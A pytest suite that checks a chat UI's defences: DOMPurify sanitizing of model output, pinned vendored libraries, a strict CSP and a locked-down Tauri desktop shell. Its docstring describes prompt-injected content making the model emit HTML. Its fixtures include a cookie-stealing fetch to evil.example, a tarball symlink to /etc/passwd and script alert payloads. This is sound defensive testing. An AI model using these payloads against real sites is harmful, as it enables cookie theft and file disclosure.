"""The web UI renders model output safely and loads only pinned, vendored code;
the desktop shell exposes no global Tauri API (fix-ui-render-and-desktop-ipc).

Model output is untrusted — a prompt-injected page, repo file, MCP result or
another session's message can make the model emit HTML. Before this fix
`renderMarkdownInto` put marked's output into innerHTML unsanitized, the
libraries came from cdn.jsdelivr.net on floating majors with no integrity
check, the page had no CSP, and the desktop window had `withGlobalTauri: true`,
`csp: null` and an IPC grant for every localhost port.

The browser-level proof (payloads render inert, nothing runs, nothing loads
from the network, the page can't be framed) is tests/e2e/test_ui_xss.py. This
file pins the static half: what index.html loads and from where, the CSP it
declares and the headers the server sends with it, the vendored bytes against
their pins (scripts/vendor_ui_libs.py), packaging, and the desktop config.
Everything runs offline against the checkout or a tmp copy.
"""

from __future__ import annotations

import base64
import hashlib
import importlib.util
import io
import json
import re
import shutil
import sys
import tarfile
from glob import glob
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
WEB = ROOT / "evi" / "apps" / "web"
INDEX = WEB / "static" / "index.html"
APP = WEB / "static" / "app.js"
VENDOR = WEB / "static" / "vendor"
DESKTOP = ROOT / "desktop" / "src-tauri"
_SCRIPT = ROOT / "scripts" / "vendor_ui_libs.py"
FILE_CSP = "default-src 'none'; style-src 'unsafe-inline'; sandbox"


def _load_script():
    spec = importlib.util.spec_from_file_location("vendor_ui_libs", _SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod  # dataclasses resolve annotations via sys.modules
    spec.loader.exec_module(mod)
    return mod


vul = _load_script()


def _html() -> str:
    return INDEX.read_text(encoding="utf-8")


def _app() -> str:
    return APP.read_text(encoding="utf-8")


def _policy(html: str) -> dict[str, list[str]]:
    policy = vul.csp_policy(html)
    assert policy, "index.html declares no Content-Security-Policy"
    return vul.csp_directives(policy)


def _fn(src: str, head: str) -> str:
    """The body of the top-level JS function that starts with `head`."""
    return src.split(head, 1)[1].split("\n}\n", 1)[0]


# ---- the checkout as committed ----------------------------------------------


def test_vendored_files_sri_pins_and_csp_are_in_sync():
    # The one-stop check (also `python scripts/vendor_ui_libs.py --check`): each
    # vendored file matches its pinned sha384, index.html / app.js load it with
    # that integrity, the page loads app.js and has no inline code, and the CSP
    # is in the form the server reads.
    assert vul.check() == []


def test_index_html_loads_no_cdn_code():
    html, app = _html(), _app()
    assert "cdn.jsdelivr.net" not in html and "cdn.jsdelivr.net" not in app
    assert "import(" not in html and "import(" not in app, "no dynamic imports"
    for tag, attrs, _body, _m in vul._elements(html):
        url = attrs.get("src") if tag == "script" else attrs.get("href")
        if tag == "script" and url is not None and url != vul.APP_JS_URL:
            assert url.startswith(vul.VENDOR_URL), url
            assert attrs.get("integrity", "").startswith("sha384-"), url
        if tag == "link" and "stylesheet" in attrs.get("rel", ""):
            assert url.startswith(vul.VENDOR_URL), url
            assert attrs.get("integrity", "").startswith("sha384-"), url


def test_every_library_the_ui_uses_is_vendored():
    names = {Path(p).parts[0] for p in vul.FILES}
    assert names == {"dompurify", "marked", "highlight", "mermaid"}
    # Exact versions only — a range or tag would float again.
    for pkg in vul.PACKAGES:
        assert re.fullmatch(r"\d+\.\d+\.\d+", pkg.version), pkg
        assert pkg.integrity.startswith("sha512-"), pkg
        assert pkg.tarball_url.startswith("https://registry.npmjs.org/"), pkg


def test_page_csp_only_runs_script_files_from_evi():
    d = _policy(_html())
    assert d["default-src"] == ["'self'"]
    # 'self' alone: no inline script (not even by hash), no 'unsafe-inline' or
    # 'unsafe-eval', no wildcard, scheme or other host. Editing the UI never
    # touches the policy.
    assert d["script-src"] == ["'self'"]
    assert d["object-src"] == ["'none'"]
    assert d["base-uri"] == ["'none'"]
    assert d["form-action"] == ["'self'"]
    # No request to another host from an <img> or fetch: exfiltration through
    # a model-chosen URL is refused even if markup gets past the sanitizer.
    assert d["img-src"] == ["'self'", "data:", "blob:"]
    assert d["connect-src"] == ["'self'", "ipc:", "http://ipc.localhost"]
    # frame-ancestors is ignored (with a console error) in a <meta> policy;
    # the server adds it to the header.
    assert "frame-ancestors" not in d
    assert not any("unsafe-eval" in s for v in d.values() for s in v)


def test_the_page_has_no_inline_code_and_loads_the_app_last():
    html = _html()
    meta = re.search(r'<meta http-equiv="Content-Security-Policy"', html)
    tags = [(t, a, m) for t, a, _b, m in vul._elements(html) if t in ("script", "link")]
    assert meta and meta.start() < min(m.start() for _t, _a, m in tags)
    assert vul.inline_scripts(html) == []
    assert vul.inline_handlers(html) == []
    # The app is one classic script — no defer/async/module, so it runs where
    # the inline script used to: after the vendored libraries and all the
    # markup, with its top-level declarations global.
    assert vul.page_scripts(html) == ["app.js"]
    scripts = [(a, m) for t, a, m in tags if t == "script"]
    attrs, m = scripts[-1]
    assert attrs == {"src": vul.APP_JS_URL}
    assert re.fullmatch(r"\s*</body>\s*</html>\s*", html[m.end():]), "app.js must load last"


def test_markdown_goes_through_dompurify_and_fails_closed():
    app = _app()
    body = _fn(app, "function renderMarkdownInto(bubble, src) {")
    assert "sanitizeMarkdown(window.marked.parse(src))" in body
    # marked's HTML never reaches innerHTML; only the escaped fallback does.
    assert "innerHTML = escapeHtml(src)" in body
    assert body.count("innerHTML") == 1
    sanitize = _fn(app, "function sanitizeMarkdown(html) {")
    assert "if (!purify || !purify.isSupported" in sanitize and "return null" in sanitize
    # The profile: html only, no ids/names/styles, links http(s)/mailto/#.
    cfg = app.split("const MD_PURIFY = {", 1)[1].split("};", 1)[0]
    assert "USE_PROFILES: { html: true }" in cfg
    # ...nor references to ids, which could only be the UI's own (<label for>).
    for attr in ("'style'", "'id'", "'name'", "'srcset'", "'for'", "'form'", "'aria-controls'"):
        assert attr in cfg.split("FORBID_ATTR")[1], attr
    for tag in ("'style'", "'form'", "'button'", "'dialog'"):
        assert tag in cfg.split("FORBID_TAGS")[1].split("FORBID_ATTR")[0], tag
    # DOMPurify's default URI rule with only http(s) and mailto left as schemes.
    assert r"ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i" in cfg
    # eVi's own images by bare name only, checked as written and as resolved:
    # a prefix check let `/images/../api/...` reach any path on eVi.
    assert r"const MD_LOCAL_IMAGE = /^\/images\/[A-Za-z0-9_-][A-Za-z0-9._-]*$/;" in app
    local = _fn(app, "function mdLocalImage(url) {")
    assert "u.origin === location.origin && u.pathname === url && !u.search" in local
    assert "/images\\/)/" not in app, "a bare /images/ prefix check is back"
    # Mermaid stays strict, and its SVG is sanitized again.
    assert "securityLevel: 'strict'" in app
    assert "container.innerHTML = svg" not in app
    assert "sanitizeDiagram(svg, id)" in app


def test_mermaid_runs_in_a_frame_that_can_load_nothing():
    # A diagram can name a resource in many ways (an image shape, a classDef,
    # a C4 colour, an init directive's CSS), and mermaid lays it out in a live
    # document — in the page, that was a no-click GET of /api/backend/pull.
    # tests/e2e/test_ui_xss.py proves the behaviour; this pins the pieces.
    app = _app()
    frame_csp = re.search(r'const MERMAID_FRAME_CSP =\s*"([^"]+)";', app).group(1)
    d = vul.csp_directives(frame_csp)
    assert d["default-src"] == ["'none'"]       # no fetch, font, media or frame
    assert d["img-src"] == ["data:"]            # not even this origin
    assert d["script-src"] == ["'self'"]        # the pinned mermaid.min.js
    assert set(d) == {"default-src", "img-src", "script-src", "style-src"}
    # Mermaid runs in that frame's window, never in the page's.
    assert "frame.contentWindow.mermaid.render(id, src)" in app
    assert "window.mermaid" not in app
    assert "if (frame.refused) throw" in app
    # A diagram's %%{init}%% / front matter can't set CSS or the label sanitizer,
    # and mermaid's own secure keys stay (the list replaces its default).
    secure = re.search(r"const MERMAID_SECURE = \[(.*?)\];", app, re.S).group(1)
    keys = set(re.findall(r"'(\w+)'", secure))
    assert {"secure", "securityLevel", "startOnLoad", "maxTextSize", "suppressErrorRendering",
            "maxEdges", "themeCSS", "themeVariables", "fontFamily", "altFontFamily",
            "dompurifyConfig"} <= keys
    assert "secure: MERMAID_SECURE" in app
    # What joins the page is shown only if vetting took nothing out of it.
    assert "return stripDiagramLoads(frag, id) === 0 ? frag : null;" in app
    for tag in ("'feimage'", "'use'", "'image'", "'img'"):
        assert tag in _fn(app, "function sanitizeDiagram(svg, id) {"), tag


def test_ui_reaches_the_shell_only_through_listed_commands():
    html, app = _html(), _app()
    assert "window.__TAURI__" not in html
    assert "window.__TAURI__" not in app.replace("window.__TAURI__ is undefined", "")
    ui = re.search(r"const DESKTOP_COMMANDS = new Set\(\[(.*?)\]\);", app, re.S).group(1)
    ui_cmds = sorted(re.findall(r"'(\w+)'", ui))
    main_rs = (DESKTOP / "src" / "main.rs").read_text(encoding="utf-8")
    rust = re.search(r"const UI_COMMANDS: \[&str; \d+\] = \[(.*?)\];", main_rs, re.S).group(1)
    build_rs = (DESKTOP / "build.rs").read_text(encoding="utf-8")
    assert ui_cmds == sorted(re.findall(r'"(\w+)"', rust))
    assert ui_cmds == sorted(re.findall(r'"(\w+_cmd)"', build_rs))


def test_ui_streams_the_model_pull_with_its_header():
    # GET /api/backend/pull needs X-Evi-Client now (an <img> must not start a
    # download), and an EventSource can't send it: the UI reads the stream
    # with fetch, whose wrapper adds the header.
    app = _app()
    assert "new EventSource('/api/backend/pull" not in app
    stream = _fn(app, "async function streamModelPull(model, onEvent) {")
    assert "await fetch('/api/backend/pull' + qs" in stream
    assert "authQuery()" not in stream  # the token rides in the header, not the URL
    wrapper = app.split("window.fetch = async function(input, init) {", 1)[1].split("\n};\n", 1)[0]
    assert "h.set('X-Evi-Client', 'web')" in wrapper
    assert app.count("streamModelPull(") == 3  # its definition + the two pull UIs


# ---- the server ships what the page references, with its headers -------------


@pytest.fixture()
def client(monkeypatch, tmp_path):
    pytest.importorskip("fastapi")
    from fastapi.testclient import TestClient

    import evi.apps.web.server as server_mod
    import evi.config as _cfg

    # HOME and the server's data dirs are resolved at import, so the env var
    # alone doesn't redirect them; point every one the app touches at tmp_path.
    monkeypatch.setenv("EVI_HOME", str(tmp_path))
    monkeypatch.setattr(_cfg, "HOME", tmp_path)
    monkeypatch.setattr(_cfg, "CONFIG_PATH", tmp_path / "config.toml")
    monkeypatch.setattr(server_mod, "IMAGE_DIR", tmp_path / "images")
    monkeypatch.setattr(server_mod, "UPLOADS_DIR", tmp_path / "uploads")
    return TestClient(server_mod.create_app())


def test_served_page_carries_the_csp_and_vendored_bytes_match_their_pins(client):
    r = client.get("/")
    assert r.status_code == 200
    assert vul.csp_policy(r.text) == vul.csp_policy(_html())
    for rel, want in vul.FILES.items():
        asset = client.get(vul.VENDOR_URL + rel)
        assert asset.status_code == 200, rel
        assert vul.sri(asset.content) == want, rel
    app = client.get(vul.APP_JS_URL)
    assert app.status_code == 200
    assert app.content == APP.read_bytes()
    assert app.headers["content-type"].startswith("text/javascript")
    # Revalidated on every load like the page, so a sidecar UI update shows.
    assert app.headers.get("cache-control") == "no-cache"


@pytest.mark.parametrize("path", ["/", "/static/index.html"])
@pytest.mark.parametrize("method", ["GET", "HEAD"])
def test_served_page_sends_the_csp_as_a_header(client, path, method):
    # Acceptance criterion 3: the page's own policy (read from index.html's
    # <meta>, its one source) plus what a <meta> policy can't carry.
    r = client.request(method, path)
    # (FastAPI answers HEAD / with 405; the headers go on every answer anyway.)
    assert r.status_code == 200 or (method, path) == ("HEAD", "/")
    header = r.headers["content-security-policy"]
    assert header == vul.csp_policy(_html()) + "; frame-ancestors 'none'"
    assert vul.csp_directives(header)["script-src"] == ["'self'"]
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["x-content-type-options"] == "nosniff"


def test_every_response_is_nosniff(client):
    for path in ("/api/health", "/static/manifest.json", vul.APP_JS_URL,
                 vul.VENDOR_URL + "marked/marked.min.js", "/static/nope.js",
                 "/api/session/bad.id/usage"):
        r = client.get(path)
        assert r.headers.get("x-content-type-options") == "nosniff", (path, r.status_code)
        if path.startswith("/api/") or path.endswith("manifest.json"):
            assert "x-frame-options" not in r.headers, path
    css = client.get(vul.VENDOR_URL + "highlight/github-dark.min.css")
    assert css.headers["content-type"].startswith("text/css")  # nosniff applies it


def test_images_and_uploads_are_sandboxed(client, monkeypatch, tmp_path):
    import evi.apps.web.server as server_mod

    images, uploads = tmp_path / "imgs", tmp_path / "ups"
    images.mkdir()
    (uploads / "s1").mkdir(parents=True)
    (images / "gen.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', encoding="utf-8")
    (uploads / "s1" / "page.html").write_text("<script>alert(1)</script>", encoding="utf-8")
    monkeypatch.setattr(server_mod, "IMAGE_DIR", images)
    monkeypatch.setattr(server_mod, "UPLOADS_DIR", uploads)
    r = client.get("/images/gen.svg")
    assert r.status_code == 200
    assert r.headers["content-security-policy"] == FILE_CSP
    assert r.headers["x-content-type-options"] == "nosniff"
    r = client.get("/uploads/s1/page.html")
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/html")
    assert r.headers["content-security-policy"] == FILE_CSP
    assert r.headers["x-content-type-options"] == "nosniff"
    assert "x-frame-options" not in r.headers  # a sandboxed file is not the page
    # A miss carries the same policy (nothing to tell apart).
    assert client.get("/images/missing.png").headers["content-security-policy"] == FILE_CSP


def test_other_html_pages_cannot_be_framed_either(client):
    r = client.get("/docs")  # FastAPI's API explorer: an HTML page on eVi's origin
    if r.status_code != 200:
        pytest.skip("no /docs page in this build")
    assert r.headers["content-security-policy"] == "frame-ancestors 'none'"
    assert r.headers["x-frame-options"] == "DENY"


def test_page_csp_has_one_source_and_follows_edits(tmp_path, monkeypatch):
    pytest.importorskip("fastapi")
    import evi.apps.web.server as server_mod

    # The server and the vendoring script read the <meta> with one pattern,
    # so `--check` passing means the server can read the policy.
    assert server_mod._CSP_META.pattern == vul._CSP_META.pattern
    page = tmp_path / "index.html"
    page.write_text('<meta http-equiv="Content-Security-Policy" content="default-src '
                    "'self'; script-src 'self'\">", encoding="utf-8")
    assert server_mod.page_csp(page) == "default-src 'self'; script-src 'self'; frame-ancestors 'none'"
    # An edit (a dev reload, a sidecar UI update) is picked up; a frame-ancestors
    # someone put in the <meta> can't loosen the header's.
    page.write_text('<meta http-equiv="Content-Security-Policy" content="default-src '
                    "'self'; frame-ancestors *; img-src data:\">", encoding="utf-8")
    assert server_mod.page_csp(page) == "default-src 'self'; img-src data:; frame-ancestors 'none'"
    # No policy it can read: nothing loads — a broken page, never an open one.
    page.write_text("<title>no policy</title>", encoding="utf-8")
    assert server_mod.page_csp(page) == "default-src 'none'; frame-ancestors 'none'"
    assert server_mod.page_csp(tmp_path / "missing.html") == "default-src 'none'; frame-ancestors 'none'"


def test_script_types_are_pinned_for_nosniff():
    # Under nosniff a script labelled text/plain (a registry mapping on some
    # Windows machines) would not run; the server pins the UI's types.
    pytest.importorskip("fastapi")
    import mimetypes

    import evi.apps.web.server  # noqa: F401  (pins the types on import)

    assert mimetypes.guess_type("app.js")[0] == "text/javascript"
    assert mimetypes.guess_type("x.css")[0] == "text/css"


def test_package_data_ships_every_vendored_file():
    # setuptools' build_py globs each package-data pattern under the package
    # and keeps the files; the frozen sidecar's `--collect-data evi` takes
    # every data file in the package, so the wheel is the narrower of the two.
    tomllib = pytest.importorskip("tomllib")
    data = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
    patterns = data["tool"]["setuptools"]["package-data"]["evi.apps.web"]
    shipped = {
        Path(f).relative_to(WEB).as_posix()
        for pat in patterns
        for f in glob(str(WEB / pat), recursive=True)
        if Path(f).is_file()
    }
    for rel in vul.FILES:
        assert f"static/vendor/{rel}" in shipped, rel
    assert "static/index.html" in shipped
    assert "static/app.js" in shipped


def test_vendored_bytes_are_never_eol_normalized():
    # `* text=auto eol=lf` at the root would rewrite a vendored file's line
    # endings on commit, and its SRI pin would then refuse it in every browser.
    attrs = (VENDOR / ".gitattributes").read_text(encoding="utf-8")
    assert re.search(r"^\*\s+binary\s*$", attrs, re.M)


# ---- the vendoring script ----------------------------------------------------


def _tarball(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in files.items():
            info = tarfile.TarInfo("package/" + name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _integrity(blob: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(blob).digest()).decode()


def test_a_tampered_release_is_refused_before_it_is_read(monkeypatch):
    # The supply-chain half of the finding: a package whose bytes differ from
    # the pinned npm integrity (a compromised or re-published release) is
    # refused outright — nothing is read out of it, let alone written.
    good = _tarball({"dist/purify.min.js": b"ok", "LICENSE": b"l"})
    evil = _tarball({"dist/purify.min.js": b"alert(document.cookie)", "LICENSE": b"l"})
    pkg = vul.Package("dompurify", "9.9.9", _integrity(good),
                      (("dist/purify.min.js", "dompurify/purify.min.js"),))
    monkeypatch.setattr(vul, "PACKAGES", (pkg,))
    monkeypatch.setattr(vul, "_download", lambda url: evil)
    with pytest.raises(ValueError, match="does not match its pinned integrity"):
        vul.fetch_all()
    monkeypatch.setattr(vul, "_download", lambda url: good)
    assert vul.fetch_all() == {"dompurify/purify.min.js": b"ok"}


def _serve_tarball(monkeypatch, members: list[tarfile.TarInfo], payloads: list[bytes]) -> None:
    """Make fetch_all see one pinned package whose tarball holds `members`."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for info, data in zip(members, payloads):
            tf.addfile(info, io.BytesIO(data) if info.isfile() else None)
    blob = buf.getvalue()
    pkg = vul.Package("dompurify", "9.9.9", _integrity(blob),
                      (("dist/purify.min.js", "dompurify/purify.min.js"),))
    monkeypatch.setattr(vul, "PACKAGES", (pkg,))
    monkeypatch.setattr(vul, "_download", lambda url: blob)


def test_tarball_members_are_read_by_exact_name_only(monkeypatch):
    # A link is refused rather than followed...
    link = tarfile.TarInfo("package/dist/purify.min.js")
    link.type = tarfile.SYMTYPE
    link.linkname = "../../../etc/passwd"
    _serve_tarball(monkeypatch, [link], [b""])
    with pytest.raises(ValueError, match="not a regular file"):
        vul.fetch_all()
    # ...and so is a name that appears twice (which copy would be "the" file?).
    twins = []
    for _ in range(2):
        info = tarfile.TarInfo("package/dist/purify.min.js")
        info.size = 1
        twins.append(info)
    _serve_tarball(monkeypatch, twins, [b"a", b"b"])
    with pytest.raises(ValueError, match="exactly one"):
        vul.fetch_all()


def test_hljs_bundle_appends_only_languages_the_common_build_lacks():
    common = b"var hljs=1;" + b"".join(b"grmr_lang%d," % i for i in range(31)) + b"grmr_php_template"
    files = {"highlight.min.js": common,
             "languages/lang1.min.js": b"L1",            # already in the common set
             "languages/php-template.min.js": b"PT",     # grmr_php_template -> php-template
             "languages/powershell.min.js": b"PS\n",
             "languages/zig.min.js": b"ZIG"}

    def read(rel: str) -> bytes:
        return files[rel]

    names = sorted("package/" + n for n in files)
    out = vul.build_hljs_bundle(read, names)
    assert out == common + b"\nPS\nZIG\n"
    with pytest.raises(ValueError, match="languages recognised"):
        vul.build_hljs_bundle(lambda rel: b"var hljs=1;grmr_x", ["package/highlight.min.js"])


def test_check_flags_tampering_extras_cdn_loads_inline_code_and_stale_pins(tmp_path):
    root = tmp_path
    shutil.copytree(VENDOR, root / vul.VENDOR_DIR)
    (root / vul.INDEX_HTML).write_text(_html(), encoding="utf-8")
    (root / vul.STATIC / "app.js").write_text(_app(), encoding="utf-8")
    assert vul.check(root) == []

    target = root / vul.VENDOR_DIR / "marked" / "marked.min.js"
    target.write_bytes(target.read_bytes() + b"\n;fetch('https://evil.example/'+document.cookie)")
    (root / vul.VENDOR_DIR / "marked" / "extra.js").write_text("x", encoding="utf-8")
    problems = vul.vendor_problems(root)
    assert any("marked/marked.min.js does not match" in p for p in problems), problems
    assert any("marked/extra.js is not a pinned" in p for p in problems), problems

    html, scripts = _html(), {"app.js": _app()}

    def problems_of(page: str, js: dict[str, str] = scripts) -> list[str]:
        return vul.html_problems(page, scripts=js)

    cdn = html.replace("</head>", '<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script></head>', 1)
    assert any("from another origin" in p for p in problems_of(cdn))
    no_sri = re.sub(r'(<script src="/static/vendor/dompurify/purify\.min\.js") integrity="[^"]*"', r"\1", html)
    assert any("purify.min.js (in index.html): integrity is None" in p for p in problems_of(no_sri))
    # Code back inline — a <script> or an on* attribute — would be refused by
    # the browser, so --check refuses it first and says where it goes.
    inline = html.replace("</body>", "<script>window.x = 1;</script></body>", 1)
    assert any("inline <script> ('window.x = 1;')" in p for p in problems_of(inline))
    handler = html.replace('<button id="reset" type="button"', '<button id="reset" onclick="x()" type="button"', 1)
    assert any("inline event handler <button onclick=>" in p for p in problems_of(handler))
    # ...and so is a script hash, or anything else, in script-src.
    hashed = html.replace("script-src 'self';", "script-src 'self' 'sha256-AAAA';", 1)
    assert any("script-src must be 'self' alone" in p for p in problems_of(hashed))
    framed = html.replace("form-action 'self'", "form-action 'self'; frame-ancestors 'none'", 1)
    assert any("frame-ancestors is ignored" in p for p in problems_of(framed))
    # The app script: loaded exactly once, present, and its on-demand pins current.
    no_app = html.replace('<script src="/static/app.js"></script>', "", 1)
    assert any("must load /static/app.js exactly once" in p for p in problems_of(no_app, {}))
    assert any("app.js, which is missing or empty" in p for p in problems_of(html, {"app.js": ""}))
    stale = {"app.js": re.sub(r"(src: '/static/vendor/mermaid/mermaid\.min\.js',\s*integrity: ')[^']*'",
                              r"\1sha384-stale'", _app(), count=1)}
    assert any("mermaid.min.js (in app.js): integrity is 'sha384-stale'" in p
               for p in problems_of(html, stale))
    # A <meta> the server couldn't read (attributes swapped) fails here too.
    swapped = re.sub(r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">',
                     r'<meta content="\1" http-equiv="Content-Security-Policy">', html, count=1)
    assert any("in that form (the server reads it)" in p for p in problems_of(swapped))


def test_sync_repairs_pins_in_the_page_and_its_scripts_and_ignores_comments():
    page = (
        '<!doctype html><head><meta charset="utf-8">\n'
        "<!-- a <script> mentioned in a comment is not a script -->\n"
        '<meta http-equiv="Content-Security-Policy" content="default-src \'self\'; '
        "script-src 'self' 'sha256-stale='; object-src 'none'\">\n"
        '<link rel="stylesheet" href="/static/vendor/a/x.css">\n'
        '<script src="/static/vendor/a/x.js" defer integrity="sha384-old"></script>\n'
        '</head><body><p title="a > b">hi</p>\n<script src="/static/app.js"></script></body>'
    )
    app = "run();\nconst BIG = { src: '/static/vendor/b/big.js', integrity: 'sha384-old' };\n"
    files = {"a/x.js": "sha384-new", "a/x.css": "sha384-css", "b/big.js": "sha384-big"}
    # 3 integrities + the hash in script-src
    assert len(vul.html_problems(page, files, {"app.js": app})) == 4
    fixed_page, fixed_app = vul.sync_html(page, files), vul.sync_script(app, files)
    assert vul.html_problems(fixed_page, files, {"app.js": fixed_app}) == []
    assert '<script src="/static/vendor/a/x.js" defer integrity="sha384-new"></script>' in fixed_page
    assert '<link rel="stylesheet" href="/static/vendor/a/x.css" integrity="sha384-css">' in fixed_page
    assert "script-src 'self'; object-src 'none'" in fixed_page and "sha256" not in fixed_page
    # A script the app loads on demand keeps its pin next to its path.
    assert fixed_app == app.replace("sha384-old", "sha384-big")
    assert vul.sync_html(fixed_page, files) == fixed_page
    assert vul.sync_script(fixed_app, files) == fixed_app


# ---- the desktop shell --------------------------------------------------------


def test_desktop_has_no_global_tauri_and_a_real_csp():
    conf = json.loads((DESKTOP / "tauri.conf.json").read_text(encoding="utf-8"))
    app = conf["app"]
    assert app["withGlobalTauri"] is False
    csp = app["security"]["csp"]
    assert isinstance(csp, str) and csp
    d = vul.csp_directives(csp)
    assert d["default-src"] == ["'self'"]
    assert d["script-src"] == ["'self'"]  # Tauri adds the shim's inline hashes
    assert d["object-src"] == ["'none'"]
    assert d["frame-ancestors"] == ["'none'"]
    # The loading shim polls the local server before redirecting to it.
    assert "http://127.0.0.1:*" in d["connect-src"]
    assert not any("unsafe-eval" in s or s == "*" for v in d.values() for s in v)
    assert "dangerousDisableAssetCspModification" not in app["security"]


def test_static_capability_grants_nothing_to_remote_pages():
    # The old grant: every desktop command (and core:default) to any page on
    # any localhost/127.0.0.1 port. IPC for the eVi page is now added at launch
    # for its exact origin (main.rs ui_capability).
    caps = sorted((DESKTOP / "capabilities").glob("*.json"))
    assert caps
    for path in caps:
        cap = json.loads(path.read_text(encoding="utf-8"))
        assert "remote" not in cap, path.name
        assert cap["permissions"] == [], path.name
    main_rs = (DESKTOP / "src" / "main.rs").read_text(encoding="utf-8")
    assert "app.add_capability(cap)" in main_rs
    assert ".on_navigation(" in main_rs
    # No wildcard-port URL anywhere in the shell's code (comments aside).
    code = "\n".join(ln for ln in main_rs.split("mod ipc_guard_tests")[0].splitlines()
                     if not ln.lstrip().startswith("//"))
    assert not re.search(r'"[^"\n]*:\*', code)
